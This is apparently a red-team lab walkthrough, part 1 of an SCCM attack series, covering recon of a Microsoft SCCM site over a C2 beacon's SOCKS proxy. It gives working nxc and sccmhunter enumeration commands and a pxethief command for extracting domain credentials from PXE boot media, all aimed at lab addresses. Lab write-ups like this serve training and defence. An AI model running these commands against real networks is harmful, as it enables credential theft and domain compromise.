# SCCM part 1 - recon and PXE

Adapts mayfly's SCCM LAB part 0x1. Establish what the site looks like, first
with no credentials, then with a low privileged domain user, and pull the first
secret from PXE.

Initial access follows the same model as the GOAD series (see
[part 1](../goad/part-01-recon.md#step-1---initial-access-patient-zero-runs-the-first-beacon)):
patient zero runs a C2 beacon through the portal, and the tooling below runs over
that beacon's SOCKS. Point `proxychains` at the beacon's SOCKS port and run the
impacket/enumeration tooling under it.

> The jumpbox SSH pivot (`ssh -i deploykey -D 1080 blueop@<jumpbox-public-ip>`,
> then `proxychains` at `127.0.0.1:1080`) is still available as an admin/scripting
> convenience, but the beacon is the engagement's initial access.

Addresses below are the `sccm.lab` range defaults: DC `192.168.56.5`, MECM
`192.168.56.3`, MSSQL `192.168.56.6`, CLIENT `192.168.56.4`.

## Recon without a user

### Find the site server

SCCM management points and site systems announce themselves in a few places. The
low noise path is to look for the site over SMB and HTTP once you can reach the
subnet, and to identify the site code (here `P01`).

```
proxychains -q nxc smb 192.168.56.3 --shares
proxychains -q sccmhunter.py find -u <user> -p <pass> -d sccm.lab -dc-ip 192.168.56.5
```

Without a user, most LDAP recon is blind; PXE below is the credential free entry
point.

### PXE

CRED-1. If a distribution point offers PXE boot with a media password that is
weak or absent, the boot media yields a domain credential. mayfly uses
`pxethief`.

```
proxychains -q python3 pxethief.py 2 192.168.56.3
```

- If PXE has no password: the media decrypts directly.
- If PXE has a password: crack the hash offline, then decrypt.

**redStackPRO status:** to be filled at live run. PXE is an optional MECM
feature; confirm the site was deployed with a PXE enabled distribution point,
otherwise mark CRED-1 N-A for this build and note it as a topology option.

## Recon with a user

A low privileged domain user (the assumed-breach foothold) opens up LDAP, SMB
and HTTP enumeration.

### LDAP

```
proxychains -q sccmhunter.py find -u <user> -p <pass> -d sccm.lab -dc-ip 192.168.56.5 -debug
```

sccmhunter reads the System Management container and the site systems published
in AD, so it names the management point, the site database server, and the site
code without touching the site server directly.

### SMB shares

```
proxychains -q nxc smb 192.168.56.3 -u <user> -p <pass> -d sccm.lab --shares
proxychains -q sccmhunter.py smb -u <user> -p <pass> -d sccm.lab -dc-ip 192.168.56.5 -debug
```

The SMB pass confirms the site systems and often exposes the `SMS_DP$` and
`REMINST` shares on a distribution point.

### Show results

```
proxychains -q sccmhunter.py show -all
```

`show` prints the picture sccmhunter has built: site server, database server,
management point, site code. This is the map the part 2 relay attacks depend on.

## Outcome

At the end of part 1 you should have, from an unprivileged position: the site
code, the identity of the site server (MECM, `192.168.56.3`), and the identity
of the **separate** site database (MSSQL, `192.168.56.6`). That separation is
the precondition for the relay takeovers in
[part 2](part-02-low-user.md).

## Step results

| step | id | result | notes |
|------|----|--------|-------|
| PXE secret | CRED-1 | | needs a PXE enabled DP |
| LDAP recon | RECON-1 | | |
| SMB recon | RECON-2 | | |
| HTTP recon | RECON-3 | | |
